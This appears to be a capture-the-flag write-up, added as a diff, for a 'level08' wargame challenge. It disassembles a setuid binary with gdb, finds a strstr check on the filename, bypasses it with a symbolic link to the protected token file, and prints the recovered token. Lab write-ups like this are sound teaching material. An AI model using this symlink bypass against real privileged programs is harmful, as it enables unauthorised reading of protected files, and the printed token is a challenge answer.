@@ -1,0 +1,31 @@
+- ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+-./level08
+./level08 [file to read]
+
+- ./level08 token
+You may not access 'token'
+
+#If we try with a file we own, the executable displays its content:
+- echo 'hello world' > /tmp/test && ./level08 /tmp/test
+hello world
+
+If we execute the program and inspect it with gdb:
+
+>$ gdb level08
+>$ (gdb) disass main
+...
+0x080485af <+91>:	mov    DWORD PTR [esp+0x4],0x8048793
+0x080485b7 <+99>:	mov    DWORD PTR [esp],eax
+0x080485ba <+102>:	call   0x8048400 <strstr@plt>
+...
+
+we see that it try to find the substring token using strstr function to check if the user try to open the file token. We can bypass this protection with a symbolic link who don't have the string token in his absolute path:
+
+- mkdir /tmp/tmp
+- cd /tmp/tmp
+- ln -s ~/token fake
+- ./level08 /tmp/tmp/fake
+quif5eloekouj29ke0vouxean
